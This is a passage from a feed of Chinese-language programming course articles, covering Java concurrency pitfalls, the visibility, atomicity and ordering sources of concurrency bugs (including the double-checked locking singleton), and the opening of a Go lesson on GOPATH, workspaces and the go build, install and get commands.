&lt;p>三是，没有充分了解并发工具的特性，还是按照老方式使用新工具导致无法发挥其性能。比如，使用了 ConcurrentHashMap，但没有充分利用其提供的基于 CAS 安全的方法，还是使用锁的方式来实现逻辑。你可以阅读一下ConcurrentHashMap 的文档，看一下相关原子性操作 API 是否可以满足业务需求，如果可以则优先考虑使用。&lt;/p>
&lt;p>四是，没有了解清楚工具的适用场景，在不合适的场景下使用了错误的工具导致性能更差。比如，没有理解 CopyOnWriteArrayList 的适用场景，把它用在了读写均衡或者大量写操作的场景下，导致性能问题。对于这种场景，你可以考虑是用普通的 List。&lt;/p>
&lt;p>其实，这四类坑之所以容易踩到，原因可以归结为，我们在使用并发工具的时候，并没有充分理解其可能存在的问题、适用场景等。所以最后，&lt;strong>我还要和你分享两点建议&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>一定要认真阅读官方文档（比如 Oracle JDK 文档）。充分阅读官方文档，理解工具的适用场景及其 API 的用法，并做一些小实验。了解之后再去使用，就可以避免大部分坑。&lt;/li>
&lt;li>如果你的代码运行在多线程环境下，那么就会有并发问题，并发问题不那么容易重现，可能需要使用压力测试模拟并发场景，来发现其中的 Bug 或性能问题。&lt;/li>
&lt;/ul>
&lt;p>今天用到的代码，我都放在了 GitHub 上，你可以点击这个链接查看。&lt;/p>
&lt;h1 id="思考与讨论">思考与讨论&lt;/h1>
&lt;ul>
&lt;li>今天我们多次用到了 ThreadLocalRandom，你觉得是否可以把它的实例设置到静态变量中，在多线程情况下重用呢？&lt;/li>
&lt;li>ConcurrentHashMap 还提供了 putIfAbsent 方法，你能否通过查阅JDK 文档，说说 computeIfAbsent 和 putIfAbsent 方法的区别？&lt;/li>
&lt;/ul>
&lt;p>你在使用并发工具时，还遇到过其他坑吗？我是朱晔，欢迎在评论区与我留言分享你的想法，也欢迎你把这篇文章分享给你的朋友或同事，一起交流。&lt;/p></description></item><item><title>极客专栏: 01丨可见性、原子性和有序性问题：并发编程Bug的源头</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/01%E4%B8%A8%E5%8F%AF%E8%A7%81%E6%80%A7%E5%8E%9F%E5%AD%90%E6%80%A7%E5%92%8C%E6%9C%89%E5%BA%8F%E6%80%A7%E9%97%AE%E9%A2%98%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8Bbug%E7%9A%84%E6%BA%90%E5%A4%B4/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/01%E4%B8%A8%E5%8F%AF%E8%A7%81%E6%80%A7%E5%8E%9F%E5%AD%90%E6%80%A7%E5%92%8C%E6%9C%89%E5%BA%8F%E6%80%A7%E9%97%AE%E9%A2%98%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8Bbug%E7%9A%84%E6%BA%90%E5%A4%B4/</guid><description>
&lt;p>如果你细心观察的话，你会发现，不管是哪一门编程语言，并发类的知识都是在高级篇里。换句话说，这块知识点其实对于程序员来说，是比较进阶的知识。我自己这么多年学习过来，也确实觉得并发是比较难的，因为它会涉及到很多的底层知识，比如若你对操作系统相关的知识一无所知的话，那去理解一些原理就会费些力气。这是我们整个专栏的第一篇文章，我说这些话的意思是如果你在中间遇到自己没想通的问题，可以去查阅资料，也可以在评论区找我，以保证你能够跟上学习进度。&lt;/p>
&lt;p>你我都知道，编写正确的并发程序是一件极困难的事情，并发程序的 Bug 往往会诡异地出现，然后又诡异地消失，很难重现，也很难追踪，很多时候都让人很抓狂。但要快速而又精准地解决&amp;quot;并发&amp;quot;类的疑难杂症，你就要理解这件事情的本质，追本溯源，深入分析这些 Bug 的源头在哪里。&lt;/p>
&lt;p>那为什么并发编程容易出问题呢？它是怎么出问题的？今天我们就重点聊聊这些 Bug 的源头。&lt;/p>
&lt;h2 id="并发程序幕后的故事">并发程序幕后的故事&lt;/h2>
&lt;p>这些年，我们的 CPU、内存、I/O 设备都在不断迭代，不断朝着更快的方向努力。但是，在这个快速发展的过程中，有一个&lt;strong>核心矛盾一直存在，就是这三者的速度差异&lt;/strong>。CPU 和内存的速度差异可以形象地描述为：CPU 是天上一天，内存是地上一年（假设 CPU 执行一条普通指令需要一天，那么 CPU 读写内存得等待一年的时间）。内存和 I/O 设备的速度差异就更大了，内存是天上一天，I/O 设备是地上十年。&lt;/p>
&lt;p>程序里大部分语句都要访问内存，有些还要访问 I/O，根据木桶理论（一只水桶能装多少水取决于它最短的那块木板），程序整体的性能取决于最慢的操作&amp;mdash;&amp;mdash;读写 I/O 设备，也就是说单方面提高 CPU 性能是无效的。&lt;/p>
&lt;p>为了合理利用 CPU 的高性能，平衡这三者的速度差异，计算机体系机构、操作系统、编译程序都做出了贡献，主要体现为：&lt;/p>
&lt;ol>
&lt;li>CPU 增加了缓存，以均衡与内存的速度差异；&lt;/li>
&lt;li>操作系统增加了进程、线程，以分时复用 CPU，进而均衡 CPU 与 I/O 设备的速度差异；&lt;/li>
&lt;li>编译程序优化指令执行次序，使得缓存能够得到更加合理地利用。&lt;/li>
&lt;/ol>
&lt;p>现在我们几乎所有的程序都默默地享受着这些成果，但是天下没有免费的午餐，并发程序很多诡异问题的根源也在这里。&lt;/p>
&lt;h2 id="源头之一缓存导致的可见性问题">源头之一：缓存导致的可见性问题&lt;/h2>
&lt;p>在单核时代，所有的线程都是在一颗 CPU 上执行，CPU 缓存与内存的数据一致性容易解决。因为所有线程都是操作同一个 CPU 的缓存，一个线程对缓存的写，对另外一个线程来说一定是可见的。例如在下面的图中，线程 A 和线程 B 都是操作同一个 CPU 里面的缓存，所以线程 A 更新了变量 V 的值，那么线程 B 之后再访问变量 V，得到的一定是 V 的最新值（线程 A 写过的值）。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/a0/da/a07e8182819e2b260ce85b2167d446da.png" alt="">
CPU 缓存与内存的关系图&lt;/p>
&lt;p>一个线程对共享变量的修改，另外一个线程能够立刻看到，我们称为&lt;strong>可见性&lt;/strong>。&lt;/p>
&lt;p>多核时代，每颗 CPU 都有自己的缓存，这时 CPU 缓存与内存的数据一致性就没那么容易解决了，当多个线程在不同的 CPU 上执行时，这些线程操作的是不同的 CPU 缓存。比如下图中，线程 A 操作的是 CPU-1 上的缓存，而线程 B 操作的是 CPU-2 上的缓存，很明显，这个时候线程 A 对变量 V 的操作对于线程 B 而言就不具备可见性了。这个就属于硬件程序员给软件程序员挖的&amp;quot;坑&amp;quot;。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/e2/ea/e2aa76928b2bc135e08e7590ca36e0ea.png" alt="">
多核 CPU 的缓存与内存关系图&lt;/p>
&lt;p>下面我们再用一段代码来验证一下多核场景下的可见性问题。下面的代码，每执行一次 add10K() 方法，都会循环 10000 次 count+=1 操作。在 calc() 方法中我们创建了两个线程，每个线程调用一次 add10K() 方法，我们来想一想执行 calc() 方法得到的结果应该是多少呢？&lt;/p>
&lt;pre>&lt;code>public class Test {
private long count = 0;
private void add10K() {
int idx = 0;
while(idx++ &amp;lt; 10000) {
count += 1;
}
}
public static long calc() {
final Test test = new Test();
// 创建两个线程，执行 add() 操作
Thread th1 = new Thread(()-&amp;gt;{
test.add10K();
});
Thread th2 = new Thread(()-&amp;gt;{
test.add10K();
});
// 启动两个线程
th1.start();
th2.start();
// 等待两个线程执行结束
th1.join();
th2.join();
return count;
}
}
&lt;/code>&lt;/pre>
&lt;p>直觉告诉我们应该是 20000，因为在单线程里调用两次 add10K() 方法，count 的值就是 20000，但实际上 calc() 的执行结果是个 10000 到 20000 之间的随机数。为什么呢？&lt;/p>
&lt;p>我们假设线程 A 和线程 B 同时开始执行，那么第一次都会将 count=0 读到各自的 CPU 缓存里，执行完 count+=1 之后，各自 CPU 缓存里的值都是 1，同时写入内存后，我们会发现内存中是 1，而不是我们期望的 2。之后由于各自的 CPU 缓存里都有了 count 的值，两个线程都是基于 CPU 缓存里的 count 值来计算，所以导致最终 count 的值都是小于 20000 的。这就是缓存的可见性问题。&lt;/p>
&lt;p>循环 10000 次 count+=1 操作如果改为循环 1 亿次，你会发现效果更明显，最终 count 的值接近 1 亿，而不是 2 亿。如果循环 10000 次，count 的值接近 20000，原因是两个线程不是同时启动的，有一个时差。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/ec/79/ec6743e74ccf9a3c6d6c819a41e52279.png" alt="">
变量 count 在 CPU 缓存和内存的分布图&lt;/p>
&lt;h2 id="源头之二线程切换带来的原子性问题">源头之二：线程切换带来的原子性问题&lt;/h2>
&lt;p>由于 IO 太慢，早期的操作系统就发明了多进程，即便在单核的 CPU 上我们也可以一边听着歌，一边写 Bug，这个就是多进程的功劳。&lt;/p>
&lt;p>操作系统允许某个进程执行一小段时间，例如 50 毫秒，过了 50 毫秒操作系统就会重新选择一个进程来执行（我们称为&amp;quot;任务切换&amp;quot;），这个 50 毫秒称为&amp;quot;&lt;strong>时间片&lt;/strong>&amp;quot;。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/25/fb/254b129b145d80e9bb74123d6e620efb.png" alt="">
线程切换示意图&lt;/p>
&lt;p>在一个时间片内，如果一个进程进行一个 IO 操作，例如读个文件，这个时候该进程可以把自己标记为&amp;quot;休眠状态&amp;quot;并出让 CPU 的使用权，待文件读进内存，操作系统会把这个休眠的进程唤醒，唤醒后的进程就有机会重新获得 CPU 的使用权了。&lt;/p>
&lt;p>这里的进程在等待 IO 时之所以会释放 CPU 使用权，是为了让 CPU 在这段等待时间里可以做别的事情，这样一来 CPU 的使用率就上来了；此外，如果这时有另外一个进程也读文件，读文件的操作就会排队，磁盘驱动在完成一个进程的读操作后，发现有排队的任务，就会立即启动下一个读操作，这样 IO 的使用率也上来了。&lt;/p>
&lt;p>是不是很简单的逻辑？但是，虽然看似简单，支持多进程分时复用在操作系统的发展史上却具有里程碑意义，Unix 就是因为解决了这个问题而名噪天下的。&lt;/p>
&lt;p>早期的操作系统基于进程来调度 CPU，不同进程间是不共享内存空间的，所以进程要做任务切换就要切换内存映射地址，而一个进程创建的所有线程，都是共享一个内存空间的，所以线程做任务切换成本就很低了。现代的操作系统都基于更轻量的线程来调度，现在我们提到的&amp;quot;任务切换&amp;quot;都是指&amp;quot;线程切换&amp;quot;。&lt;/p>
&lt;p>Java 并发程序都是基于多线程的，自然也会涉及到任务切换，也许你想不到，任务切换竟然也是并发编程里诡异 Bug 的源头之一。任务切换的时机大多数是在时间片结束的时候，我们现在基本都使用高级语言编程，高级语言里一条语句往往需要多条 CPU 指令完成，例如上面代码中的&lt;code>count += 1&lt;/code>，至少需要三条 CPU 指令。&lt;/p>
&lt;ul>
&lt;li>指令 1：首先，需要把变量 count 从内存加载到 CPU 的寄存器；&lt;/li>
&lt;li>指令 2：之后，在寄存器中执行 +1 操作；&lt;/li>
&lt;li>指令 3：最后，将结果写入内存（缓存机制导致可能写入的是 CPU 缓存而不是内存）。&lt;/li>
&lt;/ul>
&lt;p>操作系统做任务切换，可以发生在任何一条&lt;strong>CPU 指令&lt;/strong>执行完，是的，是 CPU 指令，而不是高级语言里的一条语句。对于上面的三条指令来说，我们假设 count=0，如果线程 A 在指令 1 执行完后做线程切换，线程 A 和线程 B 按照下图的序列执行，那么我们会发现两个线程都执行了 count+=1 的操作，但是得到的结果不是我们期望的 2，而是 1。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/33/63/33777c468872cb9a99b3cdc1ff597063.png" alt="">
非原子操作的执行路径示意图&lt;/p>
&lt;p>我们潜意识里面觉得 count+=1 这个操作是一个不可分割的整体，就像一个原子一样，线程的切换可以发生在 count+=1 之前，也可以发生在 count+=1 之后，但就是不会发生在中间。&lt;strong>我们把一个或者多个操作在 CPU 执行的过程中不被中断的特性称为原子性&lt;/strong>。CPU 能保证的原子操作是 CPU 指令级别的，而不是高级语言的操作符，这是违背我们直觉的地方。因此，很多时候我们需要在高级语言层面保证操作的原子性。&lt;/p>
&lt;h2 id="源头之三编译优化带来的有序性问题">源头之三：编译优化带来的有序性问题&lt;/h2>
&lt;p>那并发编程里还有没有其他有违直觉容易导致诡异 Bug 的技术呢？有的，就是有序性。顾名思义，有序性指的是程序按照代码的先后顺序执行。编译器为了优化性能，有时候会改变程序中语句的先后顺序，例如程序中：&amp;ldquo;a=6；b=7；&amp;ldquo;编译器优化后可能变成&amp;quot;b=7；a=6；&amp;quot;，在这个例子中，编译器调整了语句的顺序，但是不影响程序的最终结果。不过有时候编译器及解释器的优化可能导致意想不到的 Bug。&lt;/p>
&lt;p>在 Java 领域一个经典的案例就是利用双重检查创建单例对象，例如下面的代码：在获取实例 getInstance() 的方法中，我们首先判断 instance 是否为空，如果为空，则锁定 Singleton.class 并再次检查 instance 是否为空，如果还为空则创建 Singleton 的一个实例。&lt;/p>
&lt;pre>&lt;code>public class Singleton {
static Singleton instance;
static Singleton getInstance(){
if (instance == null) {
synchronized(Singleton.class) {
if (instance == null)
instance = new Singleton();
}
}
return instance;
}
}
&lt;/code>&lt;/pre>
&lt;p>假设有两个线程 A、B 同时调用 getInstance() 方法，他们会同时发现 &lt;code>instance == null&lt;/code> ，于是同时对 Singleton.class 加锁，此时 JVM 保证只有一个线程能够加锁成功（假设是线程 A），另外一个线程则会处于等待状态（假设是线程 B）；线程 A 会创建一个 Singleton 实例，之后释放锁，锁释放后，线程 B 被唤醒，线程 B 再次尝试加锁，此时是可以加锁成功的，加锁成功后，线程 B 检查 &lt;code>instance == null&lt;/code> 时会发现，已经创建过 Singleton 实例了，所以线程 B 不会再创建一个 Singleton 实例。&lt;/p>
&lt;p>这看上去一切都很完美，无懈可击，但实际上这个 getInstance() 方法并不完美。问题出在哪里呢？出在 new 操作上，我们以为的 new 操作应该是：&lt;/p>
&lt;ol>
&lt;li>分配一块内存 M；&lt;/li>
&lt;li>在内存 M 上初始化 Singleton 对象；&lt;/li>
&lt;li>然后 M 的地址赋值给 instance 变量。&lt;/li>
&lt;/ol>
&lt;p>但是实际上优化后的执行路径却是这样的：&lt;/p>
&lt;ol>
&lt;li>分配一块内存 M；&lt;/li>
&lt;li>将 M 的地址赋值给 instance 变量；&lt;/li>
&lt;li>最后在内存 M 上初始化 Singleton 对象。&lt;/li>
&lt;/ol>
&lt;p>优化后会导致什么问题呢？我们假设线程 A 先执行 getInstance() 方法，当执行完指令 2 时恰好发生了线程切换，切换到了线程 B 上；如果此时线程 B 也执行 getInstance() 方法，那么线程 B 在执行第一个判断时会发现 &lt;code>instance != null&lt;/code> ，所以直接返回 instance，而此时的 instance 是没有初始化过的，如果我们这个时候访问 instance 的成员变量就可能触发空指针异常。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/64/d8/64c955c65010aae3902ec918412827d8.png" alt="">
双重检查创建单例的异常执行路径&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>要写好并发程序，首先要知道并发程序的问题在哪里，只有确定了&amp;quot;靶子&amp;rdquo;，才有可能把问题解决，毕竟所有的解决方案都是针对问题的。并发程序经常出现的诡异问题看上去非常无厘头，但是深究的话，无外乎就是直觉欺骗了我们，&lt;strong>只要我们能够深刻理解可见性、原子性、有序性在并发场景下的原理，很多并发 Bug 都是可以理解、可以诊断的&lt;/strong>。&lt;/p>
&lt;p>在介绍可见性、原子性、有序性的时候，特意提到&lt;strong>缓存&lt;/strong> 导致的可见性问题，&lt;strong>线程切换&lt;/strong> 带来的原子性问题，&lt;strong>编译优化&lt;/strong> 带来的有序性问题，其实缓存、线程、编译优化的目的和我们写并发程序的目的是相同的，都是提高程序性能。但是技术在解决一个问题的同时，必然会带来另外一个问题，所以&lt;strong>在采用一项技术的同时，一定要清楚它带来的问题是什么，以及如何规避&lt;/strong>。&lt;/p>
&lt;p>我们这个专栏在讲解每项技术的时候，都会尽量将每项技术解决的问题以及产生的问题讲清楚，也希望你能够在这方面多思考、多总结。&lt;/p>
&lt;h2 id="课后思考">课后思考&lt;/h2>
&lt;p>常听人说，在 32 位的机器上对 long 型变量进行加减操作存在并发隐患，到底是不是这样呢？现在相信你一定能分析出来。&lt;/p>
&lt;p>欢迎在留言区与我分享你的想法，也欢迎你在留言区记录你的思考过程。感谢阅读，如果你觉得这篇文章对你有帮助的话，也欢迎把它分享给更多的朋友。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/cf/aa/cf393cd748a4f0e6451807c4b61843aa.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 01丨工作区和GOPATH</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/go-%E8%AF%AD%E8%A8%80%E6%A0%B8%E5%BF%83-36-%E8%AE%B2/01%E4%B8%A8%E5%B7%A5%E4%BD%9C%E5%8C%BA%E5%92%8Cgopath/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/go-%E8%AF%AD%E8%A8%80%E6%A0%B8%E5%BF%83-36-%E8%AE%B2/01%E4%B8%A8%E5%B7%A5%E4%BD%9C%E5%8C%BA%E5%92%8Cgopath/</guid><description>
&lt;h3 id="go-语言代码较多建议配合文章收听音频">【Go 语言代码较多，建议配合文章收听音频。】&lt;/h3>
&lt;p>你好，我是郝林。从今天开始，我将和你一起梳理 Go 语言的整个知识体系。&lt;/p>
&lt;p>在过去的几年里，我与广大爱好者一起见证了 Go 语言的崛起。&lt;/p>
&lt;p>从 Go 1.5 版本的自举（即用 Go 语言编写程序来实现 Go 语言自身），到 Go 1.7 版本的极速 GC（也称垃圾回收器），再到 2018 年 2 月发布的 Go 1.10 版本对其自带工具的全面升级，以及可预见的后续版本关键特性（比如用来做程序依赖管理的&lt;code>go mod&lt;/code>命令），这一切都令我们欢欣鼓舞。Go 语言在一步步走向辉煌的同时，显然已经成为软件工程师们最喜爱的编程语言之一。&lt;/p>
&lt;p>我开办这个专栏的主要目的，是要与你一起探索 Go 语言的奥秘，并帮助你在学习和实践的过程中获取更多。&lt;/p>
&lt;p>我假设本专栏的读者已经具备了一定的计算机基础，比如，你要知道操作系统是什么、环境变量怎么设置、怎样正确使用命令行，等等。&lt;/p>
&lt;p>当然了，如果你已经有了编程经验，尤其是一点点 Go 语言编程经验，那就更好了，毕竟我想教给你的，都是 Go 语言中非常核心的技术。&lt;/p>
&lt;p>如果你对 Go 语言中最基本的概念和语法还不够了解，那么可能需要在学习本专栏的过程中去查阅&lt;a href="https://golang.google.cn/ref/spec">Go 语言规范文档&lt;/a>，也可以把预习篇的基础知识图拿出来好好研究一下。&lt;/p>
&lt;p>最后，我来说一下专栏的讲述模式。我总会以一道 Go 语言的面试题开始，针对它进行解答，我会告诉你为什么我要关注这道题，这道题的背后隐藏着哪些知识，并且，我会对这部分的内容，进行相关的知识扩展。&lt;/p>
&lt;p>好了，准备就绪，我们一起开始。&lt;/p>
&lt;hr>
&lt;p>我们学习 Go 语言时，要做的第一件事，都是根据自己电脑的计算架构（比如，是 32 位的计算机还是 64 位的计算机）以及操作系统（比如，是 Windows 还是 Linux），从&lt;a href="https://golang.google.cn">Go 语言官网&lt;/a>下载对应的二进制包，也就是可以拿来即用的安装包。&lt;/p>
&lt;p>随后，我们会解压缩安装包、放置到某个目录、配置环境变量，并通过在命令行中输入&lt;code>go version&lt;/code>来验证是否安装成功。&lt;/p>
&lt;p>在这个过程中，我们还需要配置 3 个环境变量，也就是 GOROOT、GOPATH 和 GOBIN。这里我可以简单介绍一下。&lt;/p>
&lt;ul>
&lt;li>GOROOT：Go 语言安装根目录的路径，也就是 GO 语言的安装路径。&lt;/li>
&lt;li>GOPATH：若干工作区目录的路径。是我们自己定义的工作空间。&lt;/li>
&lt;li>GOBIN：GO 程序生成的可执行文件（executable file）的路径。&lt;/li>
&lt;/ul>
&lt;p>其中，GOPATH 背后的概念是最多的，也是最重要的。那么，&lt;strong>今天我们的面试问题是：你知道设置 GOPATH 有什么意义吗？&lt;/strong>&lt;/p>
&lt;p>关于这个问题，它的&lt;strong>典型回答&lt;/strong>是这样的：&lt;/p>
&lt;p>你可以把 GOPATH 简单理解成 Go 语言的工作目录，它的值是一个目录的路径，也可以是多个目录路径，每个目录都代表 Go 语言的一个工作区（workspace）。&lt;/p>
&lt;p>我们需要利于这些工作区，去放置 Go 语言的源码文件（source file），以及安装（install）后的归档文件（archive file，也就是以&amp;quot;.a&amp;quot;为扩展名的文件）和可执行文件（executable file）。&lt;/p>
&lt;p>事实上，由于 Go 语言项目在其生命周期内的所有操作（编码、依赖管理、构建、测试、安装等）基本上都是围绕着 GOPATH 和工作区进行的。所以，它的背后至少有 3 个知识点，分别是：&lt;/p>
&lt;p>&lt;strong>1. Go 语言源码的组织方式是怎样的；&lt;/strong>&lt;/p>
&lt;p>&lt;strong>2. 你是否了解源码安装后的结果（只有在安装后，Go 语言源码才能被我们或其他代码使用）；&lt;/strong>&lt;/p>
&lt;p>&lt;strong>3. 你是否理解构建和安装 Go 程序的过程（这在开发程序以及查找程序问题的时候都很有用，否则你很可能会走弯路）。&lt;/strong>&lt;/p>
&lt;p>下面我就重点来聊一聊这些内容。&lt;/p>
&lt;h2 id="知识扩展">知识扩展&lt;/h2>
&lt;ol>
&lt;li>Go 语言源码的组织方式&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>与许多编程语言一样，Go 语言的源码也是以代码包为基本组织单位的。在文件系统中，这些代码包其实是与目录一一对应的。由于目录可以有子目录，所以代码包也可以有子包。&lt;/p>
&lt;p>一个代码包中可以包含任意个以.go 为扩展名的源码文件，这些源码文件都需要被声明属于同一个代码包。&lt;/p>
&lt;p>代码包的名称一般会与源码文件所在的目录同名。如果不同名，那么在构建、安装的过程中会以代码包名称为准。&lt;/p>
&lt;p>每个代码包都会有导入路径。代码包的导入路径是其他代码在使用该包中的程序实体时，需要引入的路径。在实际使用程序实体之前，我们必须先导入其所在的代码包。具体的方式就是&lt;code>import&lt;/code>该代码包的导入路径。就像这样：&lt;/p>
&lt;pre>&lt;code>import &amp;quot;github.com/labstack/echo&amp;quot;
&lt;/code>&lt;/pre>
&lt;p>在工作区中，一个代码包的导入路径实际上就是从 src 子目录，到该包的实际存储位置的相对路径。&lt;/p>
&lt;p>所以说，Go 语言源码的组织方式就是以环境变量 GOPATH、工作区、src 目录和代码包为主线的。一般情况下，Go 语言的源码文件都需要被存放在环境变量 GOPATH 包含的某个工作区（目录）中的 src 目录下的某个代码包（目录）中。&lt;/p>
&lt;ol start="2">
&lt;li>了解源码安装后的结果&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>了解了 Go 语言源码的组织方式后，我们很有必要知道 Go 语言源码在安装后会产生怎样的结果。&lt;/p>
&lt;p>源码文件以及安装后的结果文件都会放到哪里呢？我们都知道，源码文件通常会被放在某个工作区的 src 子目录下。&lt;/p>
&lt;p>那么在安装后如果产生了归档文件（以&amp;quot;.a&amp;quot;为扩展名的文件），就会放进该工作区的 pkg 子目录；如果产生了可执行文件，就可能会放进该工作区的 bin 子目录。&lt;/p>
&lt;p>我再讲一下归档文件存放的具体位置和规则。&lt;/p>
&lt;p>源码文件会以代码包的形式组织起来，一个代码包其实就对应一个目录。安装某个代码包而产生的归档文件是与这个代码包同名的。&lt;/p>
&lt;p>放置它的相对目录就是该代码包的导入路径的直接父级。比如，一个已存在的代码包的导入路径是&lt;/p>
&lt;pre>&lt;code>github.com/labstack/echo，
&lt;/code>&lt;/pre>
&lt;p>那么执行命令&lt;/p>
&lt;pre>&lt;code>go install github.com/labstack/echo
&lt;/code>&lt;/pre>
&lt;p>生成的归档文件的相对目录就是 &lt;a href="http://github.com/labstack%EF%BC%8C">github.com/labstack，&lt;/a> 文件名为 echo.a。&lt;/p>
&lt;p>顺便说一下，上面这个代码包导入路径还有另外一层含义，那就是：该代码包的源码文件存在于 GitHub 网站的 labstack 组的代码仓库 echo 中。&lt;/p>
&lt;p>再说回来，归档文件的相对目录与 pkg 目录之间还有一级目录，叫做平台相关目录。平台相关目录的名称是由 build（也称&amp;quot;构建&amp;quot;）的目标操作系统、下划线和目标计算架构的代号组成的。&lt;/p>
&lt;p>比如，构建某个代码包时的目标操作系统是 Linux，目标计算架构是 64 位的，那么对应的平台相关目录就是 linux_amd64。&lt;/p>
&lt;p>因此，上述代码包的归档文件就会被放置在当前工作区的子目录 pkg/linux_amd64/github.com/labstack 中。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/2f/3c/2fdfb5620e072d864907870e61ae5f3c.png" alt="">&lt;br>
（GOPATH 与工作区）&lt;/p>
&lt;p>总之，你需要记住的是，某个工作区的 src 子目录下的源码文件在安装后一般会被放置到当前工作区的 pkg 子目录下对应的目录中，或者被直接放置到该工作区的 bin 子目录中。&lt;/p>
&lt;ol start="3">
&lt;li>理解构建和安装 Go 程序的过程&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>我们再来说说构建和安装 Go 程序的过程都是怎样的，以及它们的异同点。&lt;/p>
&lt;p>构建使用命令&lt;code>go build&lt;/code>，安装使用命令&lt;code>go install&lt;/code>。构建和安装代码包的时候都会执行编译、打包等操作，并且，这些操作生成的任何文件都会先被保存到某个临时的目录中。&lt;/p>
&lt;p>如果构建的是库源码文件，那么操作后产生的结果文件只会存在于临时目录中。这里的构建的主要意义在于检查和验证。&lt;/p>
&lt;p>如果构建的是命令源码文件，那么操作的结果文件会被搬运到源码文件所在的目录中。（这里讲到的两种源码文件我在&lt;a href="https://time.geekbang.org/column/article/13540?utm_source=weibo&amp;amp;utm_medium=xuxiaoping&amp;amp;utm_campaign=promotion&amp;amp;utm_content=columns">&amp;ldquo;预习篇&amp;quot;的基础知识图&lt;/a>中提到过，在后面的文章中我也会带你详细了解。）&lt;/p>
&lt;p>安装操作会先执行构建，然后还会进行链接操作，并且把结果文件搬运到指定目录。&lt;/p>
&lt;p>进一步说，如果安装的是库源码文件，那么结果文件会被搬运到它所在工作区的 pkg 目录下的某个子目录中。&lt;/p>
&lt;p>如果安装的是命令源码文件，那么结果文件会被搬运到它所在工作区的 bin 目录中，或者环境变量&lt;code>GOBIN&lt;/code>指向的目录中。&lt;/p>
&lt;p>这里你需要记住的是，构建和安装的不同之处，以及执行相应命令后得到的结果文件都会出现在哪里。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>工作区和 GOPATH 的概念和含义是每个 Go 工程师都需要了解的。虽然它们都比较简单，但是说它们是 Go 程序开发的核心知识并不为过。&lt;/p>
&lt;p>然而，我在招聘面试的过程中仍然发现有人忽略掉了它们。Go 语言提供的很多工具都是在 GOPATH 和工作区的基础上运行的，比如上面提到的&lt;code>go build&lt;/code>、&lt;code>go install&lt;/code>和&lt;code>go get&lt;/code>，这三个命令也是我们最常用到的。&lt;/p>
&lt;h2 id="思考题">思考题&lt;/h2>
&lt;p>说到 Go 程序中的依赖管理，其实还有很多问题值得我们探索。我在这里留下两个问题供你进一步思考。&lt;/p>
&lt;ol>
&lt;li>Go 语言在多个工作区中查找依赖包的时候是以怎样的顺序进行的？&lt;/li>
&lt;li>如果在多个工作区中都存在导入路径相同的代码包会产生冲突吗？&lt;/li>
&lt;/ol>
&lt;p>这两个问题之间其实是有一些关联的。答案并不复杂，你做几个试验几乎就可以找到它了。你也可以看一下 Go 语言标准库中&lt;code>go build&lt;/code>包及其子包的源码。那里面的宝藏也很多，可以助你深刻理解 Go 程序的构建过程。&lt;/p>
&lt;hr>
&lt;h2 id="补充阅读">补充阅读&lt;/h2>
&lt;h2 id="go-build-命令一些可选项的用途和用法">go build 命令一些可选项的用途和用法&lt;/h2>
&lt;p>在运行&lt;code>go build&lt;/code>命令的时候，默认不会编译目标代码包所依赖的那些代码包。当然，如果被依赖的代码包的归档文件不存在，或者源码文件有了变化，那它还是会被编译。&lt;/p>
&lt;p>如果要强制编译它们，可以在执行命令的时候加入标记&lt;code>-a&lt;/code>。此时，不但目标代码包总是会被编译，它依赖的代码包也总会被编译，即使依赖的是标准库中的代码包也是如此。&lt;/p>
&lt;p>另外，如果不但要编译依赖的代码包，还要安装它们的归档文件，那么可以加入标记&lt;code>-i&lt;/code>。&lt;/p>
&lt;p>那么我们怎么确定哪些代码包被编译了呢？有两种方法。&lt;/p>
&lt;ol>
&lt;li>运行&lt;code>go build&lt;/code>命令时加入标记&lt;code>-x&lt;/code>，这样可以看到&lt;code>go build&lt;/code>命令具体都执行了哪些操作。另外也可以加入标记&lt;code>-n&lt;/code>，这样可以只查看具体操作而不执行它们。&lt;/li>
&lt;li>运行&lt;code>go build&lt;/code>命令时加入标记&lt;code>-v&lt;/code>，这样可以看到&lt;code>go build&lt;/code>命令编译的代码包的名称。它在与&lt;code>-a&lt;/code>标记搭配使用时很有用。&lt;/li>
&lt;/ol>
&lt;p>下面再说一说与 Go 源码的安装联系很紧密的一个命令：&lt;code>go get&lt;/code>。&lt;/p>
&lt;p>命令&lt;code>go get&lt;/code>会自动从一些主流公用代码仓库（比如 GitHub）下载目标代码包，并把它们安装到环境变量&lt;code>GOPATH&lt;/code>包含的第 1 工作区的相应目录中。如果存在环境变量&lt;code>GOBIN&lt;/code>，那么仅包含命令源码文件的代码包会被安装到&lt;code>GOBIN&lt;/code>指向的那个目录。&lt;/p>
&lt;p>最常用的几个标记有下面几种。&lt;/p>
&lt;ul>
&lt;li>&lt;code>-u&lt;/code>：下载并安装代码包，不论工作区中是否已存在它们。&lt;/li>
&lt;li>&lt;code>-d&lt;/code>：只下载代码包，不安装代码包。&lt;/li>
